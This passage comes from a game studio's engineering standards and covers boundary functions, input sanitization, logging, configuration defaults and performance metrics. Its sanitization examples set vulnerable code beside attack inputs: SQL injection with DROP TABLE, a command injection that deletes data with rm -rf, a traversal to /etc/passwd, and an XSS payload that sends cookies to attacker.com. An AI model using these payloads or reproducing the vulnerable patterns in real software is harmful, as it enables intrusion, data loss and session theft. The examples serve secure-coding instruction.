| Forged economy action | Client sends `coinsAwarded=100000` or `purchaseVerified=true` | Server computes rewards, balances, purchase state, and win validation |
| Replayed request | Old reward claim or payment callback is submitted again | Use idempotency keys, state guards, timestamps, nonces, and unique constraints |
| Injection | Query field, sort key, command argument, or HTML fragment comes from input | Validate intent, parameterize values, allowlist identifiers, encode output by context |
| Privilege escalation | Internal tool user changes role, target player, or action outside their authority | Enforce role-based authorization at the server; audit privileged actions |
| Stale config | Remote config or cached rules no longer match server policy | Validate config version, expiry, signature where applicable, and safe defaults |
| Poisoned cache | Cache contains data written from an unverified path or wrong tenant/player key | Scope cache keys, validate before write, invalidate on authority changes |
| Unsafe deserialization | Native serialized objects create unexpected types or code paths | Use strict JSON schemas and reject unknown fields/types |
| Sensitive data leakage | API returns full rows, debug fields, stack traces, or personally identifiable information (PII) | Return only required fields; redact logs and responses; keep details server-side |

### 10.2 Responsibilities of a Boundary Function

Every boundary function must carry out these responsibilities, in this order:

```
1. AUTHENTICATE    → Verify the caller is who they claim to be
2. AUTHORIZE       → Verify the caller has permission for this action
3. VALIDATE        → Check that all inputs meet type, range, and business rules
4. SANITIZE        → Strip or encode characters that could cause injection
5. RATE-LIMIT      → Reject excessive call frequency
6. IDEMPOTENCY     → Detect and short-circuit duplicate requests (write ops)
7. DELEGATE        → Hand off to the service/domain layer — no business logic here
8. RESPOND         → Return a structured, typed response
9. AUDIT-LOG       → Record who did what, when, and with what result
10. CATCH-ALL      → At this boundary only: catch any unhandled exception,
                     log it with full context, return a safe error response
```

### 10.3 What a Boundary Function Must NOT Do

- Contain business logic. That belongs in the service layer.  
- Access the database directly. That belongs in the repository layer.  
- Decide game outcomes or award currency.  
- Trust any field from the request body for identity (use the session token).  
- Return stack traces, class names, or SQL text to the caller.

### 10.4 Boundary Functions by Domain

| Domain | Boundary Function Type | Examples |
|:-------|:-----------------------|:---------|
| **Server (HTTP)** | REST controller method | `weeklyBonusClaim()`, `roomJoin()` | 
| **Server (Jobs)** | Message queue consumer | `rewardBatchJobProcess()` | 
| **SmartFox** | Extension handler | `bingoClaimRequest()` | 
| **Unity Client** | API response handler | `OnBonusClaimResponse()` | 
| **Unity Client** | Input handler | `OnDaubButtonTapped()` | 
| **Web Tool** | API route handler | `POST /tools/api/adjustBalance` |

### 10.5 Code Example (Server)

See [ESTD4 §10.2 Annotated Example (PHP)](./ESTD4_-_Server_Engg_Standards.md#102-annotated-example-php) for the full annotated request handler example that implements all ten responsibilities above. That example is the canonical reference for server boundary functions.

### 10.6 Code Example (Unity Client)

A Unity button callback is a client-side boundary function — data from the hardware (a tap) crosses into game logic:

```c#
// Entry-point boundary: the button callback
private async UniTaskVoid OnDaubButtonTapped()
{
    // Step 2 (authorize): is the player allowed to daub right now?
    if (!_gameState.IsPlayerTurn) return;

    // Step 5 (rate-limit): prevent tap-spamming
    if (!_tapRateLimiter.TryConsume()) return;

    // Step 6 (idempotency): prevent double-submission
    _daubButton.interactable = false;

    // Step 10 (catch-all): entry-point boundary; typed catches handle each case
    try
    {
        // Step 7 (delegate): all logic in domain/service layer
        var result = await _gameService.DaubSubmitAsync(_ballSelected, _cts.Token);
        DaubResultProcess(result);  // Step 8 (respond/update)
    }
    catch (OperationCanceledException) { /* panel destroyed — expected */ }
    catch (ApiException ex)
    {
        Logger.Error($"[GameBoundary] Daub failed: {ex.Code}", ex); // Step 9 (log)
        ShowErrorToast(ex.PlayerFacingMessage);
    }
    finally { _daubButton.interactable = true; }
}
```

### 10.7 Code Hygiene Rules for Boundary Functions

- Boundary functions must be kept short — they should delegate to services within 30–40 lines.  
- They must never contain nested business conditionals.  
- Each boundary function is an independent entry point — it starts and ends a unit of work.  
- The try-catch at the boundary follows the entry-point pattern from [§9.3](#93-block-try-catch-the-anti-pattern-and-the-acceptable-exceptions): one try block with multiple typed catch clauses.

New code must not lower the hygiene of an existing file. The "leave the code better than you found it" principle (see [§28.3](#283-the-leave-it-better-rule)) requires that every PR improves at least one hygiene aspect of the code it touches.

---

## 11. Input Validation and Sanitization

Every piece of data entering the system from an external source is potentially hostile. Player inputs, API payloads, queue messages, file uploads, and configuration files can all contain malformed, malicious, or unexpected data. Validating and sanitizing at the boundary prevents a wide class of security vulnerabilities and runtime errors.

### 11.1 Validate at the Boundary

Validation must occur at the point where data first enters a trust boundary (Boundary function [§10](#10-boundary-functions)). Passing raw external data into internal services and validating it "somewhere later" is not acceptable.

### 11.2 Validation Rules

- **Type checking:** The value is of the expected type.  
- **Range/length checking:** Numbers are within acceptable bounds; strings do not exceed maximum length.  
- **Enumeration checking:** Values from an enumerated set must be checked against the full list.  
- **Business rule checking:** Values make sense for the domain (e.g., a bet amount cannot be negative).  
- **Presence checking:** Required fields are present and not null/empty.

### 11.3 Input Sanitization

**What Is Input Sanitization?**

Input sanitization is the practice of inspecting, cleaning, and validating all data that enters your system — from any source — before it is processed, stored, or rendered. The key word is any source: HTTP request parameters, form fields, headers, cookies, file uploads, third-party API responses, and even data read back from your own database.

The fundamental rule is simple:
> *Never trust input. Validate intent. Reject ambiguity.*

The examples below demonstrate what happens when this rule is ignored, and how straightforward sanitization prevents each class of failure.

---

**Example 1: SQL Injection — PHP API Server**

**The Situation**

A player searches for a leaderboard entry by their username. The PHP handler builds a query directly from the request parameter.

```php
// ❌ VULNERABLE
$username = $_GET['username'];
$query = "SELECT * FROM leaderboard WHERE username = '$username'";
$result = $db->query($query);
```

**The Attack**

An attacker supplies the following as the username parameter:

```sql
' OR '1'='1'
```

The resulting query becomes:

```sql
SELECT * FROM leaderboard WHERE username = '' OR '1'='1'
```

The condition `'1'='1'` is always true. The query now returns every row in the leaderboard table. With a slightly more targeted payload, an attacker can also delete data, drop tables, or extract password hashes:

```sql
'; DROP TABLE leaderboard; --
```

**The Fix: Prepared Statements**

Never interpolate user input into a query string. Use prepared statements, where the query structure is defined first and user data is bound separately. The database engine then treats the bound values as data only — never as executable SQL.

```php
// ✅ SAFE
$stmt = $db->prepare("SELECT * FROM leaderboard WHERE username = ?");
$stmt->bind_param("s", $_GET['username']);
$stmt->execute();
$result = $stmt->get_result();
```

No matter what the username value contains, it is treated as a literal string. The query structure cannot be altered by user input.

---

**Example 2: Command Injection — Java API Server**

**The Situation**

An internal tool allows operations staff to generate a server-side report by passing a date range. The Java handler naively passes the parameter directly to a shell command.

```java
// ❌ VULNERABLE
String date = request.getParameter("date");
String command = "generate-report.sh " + date;
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
```

**The Attack**

An attacker (or a malicious insider) supplies:

```shell
2024-01-01; rm -rf /var/game-data/
```

The shell receives:

```shell
generate-report.sh 2024-01-01; rm -rf /var/game-data/
```

The semicolon terminates the first command and begins a second. The second command deletes game data. The attacker has full access to anything the Java process has permission to touch.

**The Fix: Avoid Shell Interpolation; Validate Format**

The most effective fix is to avoid constructing shell commands with user input altogether. Pass arguments as a list, not a string, so the shell never interprets them. Additionally, validate that the input matches the expected format before it goes anywhere near execution.

```java
// ✅ SAFE
String date = request.getParameter("date");

// Step 1: Validate format strictly — reject anything that does not look like a date
if (!date.matches("^\\d{4}-\\d{2}-\\d{2}$")) {
    throw new IllegalArgumentException("Invalid date format.");
}

// Step 2: Pass as a discrete argument — the shell never sees it as a command
ProcessBuilder pb = new ProcessBuilder("/usr/local/bin/generate-report.sh", date);
pb.start();
```

The `matches()` call acts as an allowlist: the only characters permitted are digits and hyphens in a specific pattern. Any payload containing `;`, `&`, `|`, or spaces fails immediately.

---

**Example 3: Path Traversal — Java File Download Endpoint**

**The Situation**

Players can download their saved game files. The Java endpoint takes a filename from the request and serves it from a designated storage directory.

```java
// ❌ VULNERABLE
String filename = request.getParameter("file");
File file = new File("/var/game-saves/" + filename);
serveFile(file);
```

**The Attack**

An attacker requests:

```shell
../../etc/passwd
```

The resolved path becomes:

```shell
/var/game-saves/../../etc/passwd
```

Which the OS resolves to:

```shell
/etc/passwd
```

The attacker has stepped outside the intended directory entirely. Depending on what the server has access to, they can read configuration files, private keys, or any file on the filesystem. This is called a **path traversal** or **directory traversal** attack.

**The Fix: Canonicalize and Enforce Boundary**

Resolve the full canonical path of the requested file and verify it starts with the intended base directory before serving anything.

```java
// ✅ SAFE
String filename = request.getParameter("file");
File baseDir = new File("/var/game-saves/").getCanonicalFile();
File requestedFile = new File(baseDir, filename).getCanonicalFile();

// Enforce that the resolved path is still inside the base directory
if (!requestedFile.toPath().startsWith(baseDir.toPath())) {
    throw new SecurityException("Access denied: path traversal detected.");
}

serveFile(requestedFile);
```

`getCanonicalFile()` resolves all `..` segments and symlinks before the boundary check. No matter how many `../` the input contains, the final path is always absolute and verifiable.

---

**Example 4: Cross-Site Scripting (XSS) — NextJS Internal Tools**

**The Situation**

The internal operations dashboard displays a player's display name in a support ticket view. A React component renders the name using `dangerouslySetInnerHTML` for flexibility.

```tsx
// ❌ VULNERABLE
function PlayerBadge({ displayName }: { displayName: string }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: displayName }} />
    );
}
```

**The Attack**

A malicious player sets their in-game display name to:

```html
<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
```

When an operations staff member opens the support ticket for this player, the browser executes the injected script. The script exfiltrates the staff member's session cookies to an attacker-controlled server. The attacker now has an authenticated session as an internal operations user.

This is a **Stored XSS** attack: the payload is persisted in the database and executes every time any user views the affected record.

**The Fix: Never Use** `dangerouslySetInnerHTML` for User Content; Sanitize Before Render

The safest fix is to never use `dangerouslySetInnerHTML` for any value that originates from user input. React's default JSX rendering escapes HTML characters automatically — use it.

```tsx
// ✅ SAFE — React escapes the string automatically
function PlayerBadge({ displayName }: { displayName: string }) {
    return (
        <div>{displayName}</div>
    );
}
```
React renders `<script>...</script>` as the literal text `&lt;script&gt;...&lt;/script&gt;` — it is displayed, not executed.

If rich formatting is genuinely required (e.g., bold or italic in user-generated content), use a dedicated sanitization library such as `DOMPurify` to strip all executable content before rendering.

```tsx
// ✅ SAFE — when rich HTML is unavoidable
import DOMPurify from 'dompurify';

function PlayerBadge({ displayName }: { displayName: string }) {
    const safeHTML = DOMPurify.sanitize(displayName, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong'], // explicit allowlist only
    });
    return (
        <div dangerouslySetInnerHTML={{ __html: safeHTML }} />
    );
}
```
An allowlist approach (`ALLOWED_TAGS`) is always safer than a blocklist. You define what is permitted; everything else is stripped.

---

**Example 5. Integer and Type Coercion**

Accepting a numeric input as a raw string and using it without coercion can cause logic errors or crashes.

```python
# ❌ Dangerous — user supplies: -999 or 1000000 or "abc"
page = request.args["page"]
offset = page * 20  # TypeError if string; logic error if negative

# ✅ Sanitized — coerce, then clamp to a valid range
try:
    page = int(request.args["page"])
except (ValueError, TypeError):
    page = 1

PAGE_MIN = 1
PAGE_MAX = 500
page = max(PAGE_MIN, min(page, PAGE_MAX))

offset = (page - 1) * 20
```

---

**Example 6. Email Address Normalisation**

User-supplied emails should be normalised before storage to avoid duplicate accounts.

```python
# ❌ Raw input — "  Alice@Example.COM " and "alice@example.com"
#    would be stored as two different users
email = request.form["email"]

# ✅ Sanitized — strip whitespace, lowercase, validate format
import re

email = request.form["email"].strip().lower()

EMAIL_PATTERN = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
if not EMAIL_PATTERN.match(email):
    raise ValueError("Invalid email address")
```

---

**Example 7. File Upload — Validate Type and Strip Metadata**

Accepting file uploads without sanitization can allow executable files or metadata-embedded attacks.

```python
import imghdr
from PIL import Image
import io

# ❌ Trusting the client-supplied filename and MIME type
filename = uploaded_file.filename          # could be "shell.php"
mime     = uploaded_file.content_type     # client can lie

# ✅ Sanitized
# 1. Ignore the original filename entirely; generate a safe one
import uuid
safe_filename = f"{uuid.uuid4()}.png"

# 2. Verify the actual file content, not the claimed type
raw_bytes = uploaded_file.read()
if imghdr.what(None, raw_bytes) not in ("jpeg", "png", "gif", "webp"):
    raise ValueError("File is not a permitted image type")

# 3. Re-encode the image to strip any embedded metadata or payloads
image = Image.open(io.BytesIO(raw_bytes))
output = io.BytesIO()
image.save(output, format="PNG")
clean_bytes = output.getvalue()
```

Re-encoding forces the data through a known-safe decoder and discards anything that isn't a valid pixel.

**Sanitization Summary**

| Threat | Sanitization Technique |
|:-------|:-----------------------|
| SQL Injection | Parameterised queries / prepared statements |
| XSS | Escape output; strip dangerous HTML tags |
| HTML output | HTML-encode any user-supplied string before rendering. |
| Path Traversal | Resolve real path; assert it is inside the allowed root |
| Command Injection | Never use `shell=True;` pass args as a list |
| Type / Range Errors | Coerce type; clamp to valid range |
| Duplicate / malformed data | Normalise (trim, lowercase, reformat) before storage |
| Malicious file uploads | Validate by content; regenerate with a safe filename; re-encode |
| Log messages | Strip or encode control characters and newlines to prevent log injection. |
| File system paths | Canonicalize and whitelist paths; never use user input as a raw path component. |
| Shell commands | Never construct shell commands from user input. Use safe APIs with argument arrays. |
| JSON/XML output | Use serializers; never manually concatenate user data into JSON/XML strings. |

The overarching rule: never trust input. Treat everything from outside your process boundary as hostile until you have explicitly verified and transformed it into the shape your system expects.

### 11.4 Sanitization vs. Validation — Knowing the Difference

These two terms are often used interchangeably but serve distinct purposes. Both are necessary.

|    | Validation | Sanitization |
|:---|:-----------|:-------------|
| **What it does** | Checks if input meets expected rules | Transforms or strips input to make it safe |
| **Outcome on failure** | Reject the input entirely | Clean the input and continue |
| **Example** | `date` must match `YYYY-MM-DD` | Strip `<script>` tags from a display name 
| **Best used for** | Structured inputs (dates, IDs, enums) | Free-text inputs (names, descriptions, messages) |

A robust system applies both: validate structure first, then sanitize content. If validation fails, reject immediately — do not attempt to sanitize malformed input.

**The Rule of Thumb**

> *Validation decides whether input is acceptable. Sanitization decides whether it is safe. Apply validation first. Apply sanitization always.*

### 11.5 Rejection Behavior

Reject invalid input with a specific, structured error response. Return the reason category, not the raw error message (which may leak internal details). Log the rejection at WARN level including the player/session ID and the violated rule — but not the raw input value (which may contain PII).

---

## 12. Logging

Logging is your primary tool for diagnosing issues in production. In a live-service game where players may be experiencing a problem right now, the difference between a well-structured log and an unstructured one can be the difference between a 5-minute fix and a 3-hour incident. Good logs are written with the 2 a.m. incident responder in mind.

### 12.1 Log Levels

| Level | When to Use |
|:------|:------------|
| `DEBUG` | Verbose diagnostic data useful only during development. Must never be enabled in production. |
| `INFO` | Normal operational events: server start/stop, player login, room creation, game start/end, content resets. |
| `WARN` | Unexpected but recoverable situations: retry triggered, fallback used, rate limit approaching. |
| `ERROR` | Failures that affect a specific operation but do not stop the service: failed award, DB write failure. |
| `FATAL` | Imminent or actual loss of service: cannot connect to DB at startup, uncaught exception at boundary. |

### 12.2 What Every Log Entry Must Contain

Structured logging (JSON format) is mandatory on all server-side components. Every log entry must include:

- `timestamp` — UTC, ISO 8601 format  
- `level` — the log level  
- `service` — e.g., `legacy-api`, `new-bingo-api`, `live-server`  
- `correlationId` / `requestId` — used to trace an entire request across components  
- `playerId` — where applicable; omit or redact where privacy rules apply  
- `message` — human-readable, consistent phrasing  
- `errorCode` — for `ERROR` and `FATAL` entries  
- `stackTrace` — for `ERROR` and `FATAL` entries, in a structured field, not inlined in message

**Server-side logging example (Java microservice):**

```json
{
  "timestamp": "2026-03-18T02:30:01.123Z",
  "level": "ERROR",
  "service": "reward-service",
  "component": "RewardClaimHandler",
  "correlationId": "a4f9b21c-0000-4b92-9e1d-000000001234",
  "playerId": 98765,
  "endpoint": "POST /api/v1/players/98765/rewards/claim",
  "message": "Failed to award weekly bonus — database exception",
  "errorCode": "DB_WRITE_FAILURE",
  "durationMs": 1203,
  "stackTrace": "com.bingo.reward.DatabaseException: Deadlock found when trying to get lock..."
}
```

**Client-side logging example (Unity/C# — note: client logs are less structured but must still carry context):**

```json
{
  "message": "log Message",
  "category": "feature category",
  "user_id": <userId>,
  "device": <DeviceInfo.DeviceType>,
  "build": <DeviceInfo.BuildNumber>,
  "minor_version": <DeviceInfo.BuildMinorVersion>,
  "odid": <PlayerService.OpenUDID>,
  "time": <Time.realtimeSinceStartup.ToString(CultureInfo.InvariantCulture)>,
  "priority": "Log priority",
  "sfs_version": <sfs Version>
};
```

```c#
// Client-side: always include player state context in error logs
Log.Exception(LogChannels.Client, "BASH_LEAGUES", "Null error on OnPlayerDataReadySignal", ex);

Log.Error(LogChannels.Client, "TIER_ICON_LOAD", "Load Fail TierId : " + tierId);

// Client-side INFO for key player-facing events
Log.Info(LogChannels.Client, "TIER_ICON_LOAD", "Asset Reference is NULL, TierId : " + tierId);
```

**PHP server-side logging example:**

```php
// Always use structured context array — never concatenate into the message string
$this->logger->error('Failed to process reward claim', [
    'correlationId' => $request->getCorrelationId(),
    'playerId'      => $playerId,
    'rewardId'      => $rewardId,
    'errorCode'     => $e->getErrorCode(),
    'durationMs'    => $stopwatch->getElapsedMs(),
    'stackTrace'    => $e->getTraceAsString(),
]);
```

### 12.3 What Must Never Be Logged

- Passwords or password hashes  
- Payment card data or bank account numbers  
- Full session tokens or authentication credentials  
- GDPR/CCPA-sensitive personal data (date of birth, email address, IP address) unless the logging pipeline explicitly handles PII with masking and retention controls

### 12.4 Log Volume Discipline on Hot Paths

Logging is not free. On hot paths (tight loops, per-frame updates, per-message processing in SmartFox, per-request middleware), uncontrolled logging consumes CPU time for string formatting, memory for log buffer allocation, and I/O bandwidth for log shipping. In a high-concurrency server handling thousands of simultaneous room events, a single extra log statement per event can measurably increase latency.

**Server-side hot path strategy:**

On the server, a "hot path" is any code called on every API request or every SmartFox message. Apply the following strategies:

1. **Level-guard before constructing log strings.** If your logger provides a level check, use it before building the message.

```java
// BAD — string is always constructed, even if DEBUG is disabled
logger.debug("Processing daub for player " + userId + " in room " + roomId + ", ball=" + ballNumber);

// GOOD — string only built when DEBUG is enabled
if (logger.isDebugEnabled()) {
    logger.debug("Processing daub for player {} in room {}, ball={}", userId, roomId, ballNumber);
}
```
2. **Use parameterized logging**. SLF4J and most modern loggers accept format strings with `{}` placeholders. The message string is only constructed when the log level is enabled.

```java
// This is equivalent to the level-guard pattern in SLF4J
logger.debug("Processing daub for player {} in room {}, ball={}", userId, roomId, ballNumber);
```

3. **Rate-limit recurring log messages**. For conditions that persist over many events (e.g., a slow database), do not log on every occurrence — log at most once per N seconds.

```php
// Server: rate-limit a warning that would fire on every slow query
if ($this->shouldLogRateLimit('slow_query_warning', intervalSec: 10)) {
    $this->logger->warn('Slow query detected on player table', ['durationMs' => $durationMs]);
}
```

**Client-side hot path strategy (Unity):**

On the client, any code running inside Update(), FixedUpdate(), or a SmartFox message callback is a hot path. Apply these strategies:

1. **Strip DEBUG logs from production builds entirely** using conditional compilation attributes:

```c#
[System.Diagnostics.Conditional("DEVELOPMENT_BUILD")]
private void LogBallDraw(int ball)
{
    // This entire method call is removed by the compiler in non-development builds
    Logger.Debug($"Ball drawn: {ball}");
}
```

2. **Never construct a string in per-frame code unless logging is enabled:**

```c#
// BAD — allocates a string every frame regardless of log level
private void Update()
{
    Logger.Debug($"Room state: {_roomState}, Ball: {_currentBall}");
}

// GOOD — zero allocation when DEBUG is off
private void Update()
{
    if (Logger.IsDebugEnabled)
    {
        Logger.Debug($"Room state: {_roomState}, Ball: {_ballCurrent}");
    }
}
```

3. **Time-throttle recurring messages:**

```c#
private float _reconnectLogTimeLast;
private const float RECONNECT_LOG_INTERVAL_SEC = 5.0f;

private void Update()
{
    if (_isReconnecting && Time.unscaledTime - _reconnectLogTimeLast >= RECONNECT_LOG_INTERVAL_SEC)
    {
        Logger.Warn("Still attempting SmartFox reconnect...");
        _reconnectLogTimeLast = Time.unscaledTime;
    }
}
```

4. **Use a reusable** `StringBuilder` for multi-part debug messages on hot paths:

```c#
private readonly StringBuilder _logBuilder = new StringBuilder(256);

private void RoomStateDebugLog()
{
    _logBuilder.Clear();
    _logBuilder.Append("Room ").Append(_roomId)
               .Append(" | Players: ").Append(_playerCount)
               .Append(" | Ball: ").Append(_ballCurrent);
    Logger.Debug(_logBuilder.ToString()); // One allocation, not N
}
```

---

## 13. Configuration Management

### 13.1 No Hardcoded Values

All configuration that might change — especially in a live-service context — must be externalized:

```php
// BAD
$contentResetIntervalDays = 7;

// GOOD — from config
$contentResetIntervalDays = Config::get('content.reset_interval_days');
```

### 13.2 Configuration Hierarchy

```
Code defaults ← Config files ← Environment variables ← Runtime feature flags
     │               │                  │                        │
  Lowest           Per-env           CI/CD inject            CMS / feature
  priority         YAML/JSON         at deploy time          flag service
  (in code)        (committed)       (secrets, URLs)         (highest priority)
```

### 13.3 What Are Code Defaults?

**Code defaults** are the values baked into the source code that a configuration variable uses when no override is provided at any higher layer. They are the **last-resort fallback** and must always produce a safe, functional, conservative behavior.

In a live-service game, a configuration service outage or a missed environment variable must not crash the application or enable an insecure state. Code defaults ensure that the system degrades gracefully to a known-good baseline.

**Thumb rules for setting code defaults:**
The following thumb rules govern how code defaults must be chosen. Applying these consistently ensures that a misconfigured environment degrades gracefully rather than catastrophically.

**Rule 1 — Default to the safe conservative value, not the optimistic one.** When in doubt, the default must protect data integrity and player experience over throughput or performance. A conservative default that causes mild slowness is better than an aggressive default that causes data loss.

```
reconnect_window_sec: default 120 (conservative — gives players time to reconnect)
                      NOT 10 (aggressive — would evict players too fast)

max_reward_payout:    default 500 (conservative — prevents runaway payouts)
                      NOT 999999 (unconfigured "unlimited" = economy-destroying risk)
```

**Rule 2 — Defaults must represent a working, tested state.** A code default of `0`, `null`, `""`, or `-1` is almost never a valid operational value. It typically means "I didn't think about this." Every default must be a value that the system can run on safely and that has been tested.

**Rule 3 — Defaults must be named constants, never inline literals.** An inline literal in a `configService.get()` call is invisible to search and impossible to understand in context. Always extract to a `private static final` (Java), `const` (C#/JS), or `define` (PHP).

```java
// BAD — what does 300 mean? Where else is it used? What's the unit?
int ttlSeconds = configService.getInt("session.ttl_sec", 300);

// GOOD — named, documented, and findable
private static final int SESSION_TTL_SEC_DEFAULT = 300; // 5-minute session TTL
int ttlSeconds = configService.getInt("session.ttl_sec", SESSION_TTL_SEC_DEFAULT);
```

**Rule 4 — Defaults must reflect production expectations, not development convenience.** Never ship a default designed for local development (e.g., `log_level = DEBUG`, `ssl_verify = false`, `rate_limit = 999999`). Defaults ship in the production binary; they must be production-safe.

**Rule 5 — Defaults must be documented with unit and rationale.** Every named default constant must have a doc-comment explaining its unit, its rationale, and who approved it.

```java
/**
 * Default minimum number of players required before a Bingo room starts.
 * Below this count, the game countdown does not begin.
 * Unit: players (integer count)
 * Rationale: Balance between room utilization and player wait time.
 * Owner: Game Design. Configured via CMS; this default applies if CMS is unreachable.
 */
private static final int ROOM_START_PLAYER_COUNT_MIN_DEFAULT = 5;
```

**Rule 6 — Content-cadence values must never use a hardcoded period as a default.** See [§13.5](#135-content-reset-cadence). The single permitted exception is a safety guard that fires only if the config service is completely unreachable:

```java
// Acceptable — a conservative fallback, not an assumption about content cadence
private static final int RESET_PERIOD_DAYS_FALLBACK = 7; // Safe default; override in all envs
int resetPeriod = configService.getInt("content.reset_period_days", RESET_PERIOD_DAYS_FALLBACK);
```

**Rule 7 — Every default must appear in the per-environment config as an explicit override.** Code defaults are the floor of a configuration system, not the operational value. Every environment's config file should explicitly set every configurable parameter — the default exists as a safety net, not as an operational choice.

```php
// BAD — no unit, no rationale, unsafe default (effectively no limit)
private const RATE_LIMIT = 0;

// GOOD — unit in name, safe default, comment explains the reasoning
/** Maximum reward claims per player per hour. 0 = unlimited (never use in production). */
private const REWARD_CLAIM_RATE_LIMIT_PER_HOUR = 5;
```

```java
// BAD — missing default means NullPointerException if config service is down
String resetPeriod = configService.get("content.reset_period_days");

// GOOD — safe fallback with explicit comment
// Default: 7 days. Actual value always comes from CMS config at runtime.
int resetPeriodDays = configService.getInt("content.reset_period_days", /*default=*/7);
```

**Rule 8 — Default to UTC timezone.** Any non-UTC default creates timezone bugs.

```java
defaultTimezone = "UTC";
```

**Rule 9 — Default to short TTLs.** Stale cache is worse than a cache miss.

**Rule 10 — Never default to valid secrets or credentials.** Keep in mind that the defaults are in source code — public. Use placeholder that forces explicit configuration.

### 13.4 Feature Flags

All new features must ship behind a feature flag. Feature flags must be readable from the server at runtime without a deploy. They must have a name, description, owner, and expiry date. Dead feature flags must be cleaned up within 2 sprints.

### 13.5 Content Reset Cadence

Content resets do not necessarily occur on a fixed weekly schedule. They occur periodically as defined by the content team and configured via the CMS or feature flag system. No code should hardcode a "7-day cycle" assumption. Use a centralized ContentResetService or equivalent that reads the reset schedule from configuration:

```java
// BAD — hardcodes a 7-day assumption
long daysSinceReset = ChronoUnit.DAYS.between(lastResetDate, LocalDate.now());
if (daysSinceReset >= 7) { triggerReset(); }

// GOOD — reads period from configuration
int configuredResetPeriodDays = configService.getInt("content.reset_period_days");
if (daysSinceReset >= configuredResetPeriodDays) { triggerReset(); }
```

### 13.6 Feature Flag Lifecycle and Cleanup

A feature flag is a temporary delivery control, not a permanent design pattern. Every new flag must record: owner, purpose, rollout scope, default state by environment, kill-switch behavior, creation date, and planned removal date. Temporary rollout flags must be removed within two sprints after the rollout is complete or the feature is abandoned. Long-lived entitlement or configuration switches must be explicitly classified as permanent and documented in the configuration inventory.

Before every production release, review any flag touched by the release and verify:

- the flag still has a current owner;
- the default state is correct in each environment;
- stale "always on" or "permanently off" flags have cleanup tickets;
- emergency kill switches have been exercised in a non-production environment.

---

## 14. Performance Awareness and KPI Measurement

Performance in a live-service game is not a "nice to have" — it directly affects player retention. A slow API during a content reset on a Monday morning will be felt by thousands of concurrent players. Performance regressions introduced in one release compound over time.

### 14.1 Percentile-Based Measurement: p95, p98, p99

Response time distributions are measured using percentiles, not averages. An average hides the experience of the worst-affected players. Percentiles tell you the maximum time for a given fraction of your players.

```
Percentile Meaning:

p50  (median)  → 50% of requests complete in this time or faster
p95            → 95% of requests complete in this time or faster
                 ("5 in 100 players experience something worse than this")
p98            → 98% of requests complete in this time or faster
                 ("2 in 100 players experience something worse than this")
p99            → 99% of requests complete in this time or faster
p99.9          → 99.9% of requests — the "tail latency" 1-in-1000 case

Example:
  p50  = 45ms   ← most players see this
  p95  = 210ms  ← 5% of players see ≥210ms
  p98  = 480ms  ← 2% of players see ≥480ms
  p99  = 920ms  ← 1% of players sees ≥920ms

If your p99 is 920ms but your p50 is 45ms, you have a tail latency
problem — a small percentage of players consistently gets a bad experience.
```

**Why p95 and p98 are preferred over averages:** An average API response time of 100ms is meaningless if 5% of players wait 2 seconds. p95 tells us that 95% of players are within our target; p98 tells us we've covered 98%.

### 14.2 Metric Types: Counter, Histogram, and Gauge

Understanding the three primary metric types ensures you instrument code correctly. Choosing the wrong type produces misleading dashboards.

**Counter** — a value that only ever increases (or resets on restart). It counts occurrences. Use for: `api.request.count`, `reward.claim.count`, `error.count`, `ball.draw.count`.

```
api.request.count → 0, 1, 2, 3, ... 1,204,788 (never decreases)
```

**Histogram / Distribution** — records individual measured values and places them in configurable buckets, allowing computation of percentiles (p50, p95, p98, p99). Use for: `api.request.duration`, `db.query.duration`, `smartfox.room_join.latency`.

```
api.request.duration records: [45ms, 52ms, 48ms, 480ms, 61ms, ...]
→ p50=48ms, p95=210ms, p98=480ms (computed from the distribution)
```

**Gauge** — a point-in-time snapshot of a value that can increase or decrease. It represents the current state, not a cumulative count. Use for any metric that answers "how many right now?" or "what is the current value?":

```
game.room.active_count       → 823    (rooms running right now)
game.player.connected_count  → 12,450 (players in SmartFox right now)
cache.memory_used_mb         → 412    (current Redis memory usage)
db.connection_pool.used      → 28     (of 50 pool connections in use)
sqs.queue.depth              → 1,204  (jobs waiting to be processed)
```

**Why Gauges matter for operations:** A Gauge dropping unexpectedly signals an incident. `game.room.active_count` suddenly falling from 800 to 0 during peak hours means SmartFox has crashed — and a Gauge-based alert fires within seconds, before a single support ticket arrives. A Counter cannot express this because it never decreases.

Gauge-based alert examples:

- `game.room.active_count < 10` during peak hours → likely SmartFox crash; page on-call.  
- `sqs.queue.depth > 5000` → background workers behind; investigate.  
- `db.connection_pool.used / pool_size > 0.85` → pool exhaustion imminent; scale up.

Gauges must be sampled on a regular polling interval (every 10–30 seconds), not per-event.

### 14.3 Performance Targets (Baselines)

| Operation | Target (p95) | Alert Threshold (p98) |
|:----------|:-------------|:----------------------|
| API response (read operations) | < 100ms | > 500ms 
| API response (write/transactional) | < 200ms | > 1000ms |
| Database query | < 50ms | > 200ms | 
| SmartFox room join | < 300ms | > 1000ms |
| Client scene load (mobile) | < 3 seconds | > 8 seconds |
| Cold app launch to lobby | < 5 seconds | > 10 seconds |

These targets apply under normal production load. During content reset windows, targets relax by 50% and are separately monitored.

### 14.4 Common Performance Pitfalls

- **N+1 queries:** Loading a collection and then querying for each item individually. Always batch.  
- **Unbounded queries:** `SELECT *` with no `LIMIT` on large tables.  
- **Synchronous blocking on the main thread** (especially in Unity).  
- **Missing indexes** on foreign keys and WHERE-clause columns.  
- **Polling instead of events:** Do not poll the server every second. Use push (SmartFox) or server-sent events.  
- **Fat payloads:** Never send more data than needed.  
- **Memory leaks in Unity:** Subscribe/unsubscribe events must be balanced.

---

## 15. Stateful vs. Stateless Patterns

The decision of whether a component stores state (stateful) or not (stateless) is one of the most consequential architectural decisions you make. It determines how the component scales, how it fails, and how it is deployed. Understanding this distinction is essential for every engineer on the team.

### 15.1 What is State?

**State** is any information that persists between requests, method calls, or connections. If you need to remember something about a previous interaction to handle the next one, you have state.

- **Stateless:** Each request or interaction is independent. The component needs no memory of previous interactions to process the current one.  
- **Stateful:** The component maintains information between interactions. Processing the current request requires knowledge of prior interactions.

### 15.2 Comparison

```
STATELESS Component                      STATEFUL Component
──────────────────────────────────       ──────────────────────────────────
PHP API server                           SmartFox live server
New Java microservices                   Player session in Redis
CloudFront CDN                           Active Bingo room state

ADVANTAGES:                              ADVANTAGES:
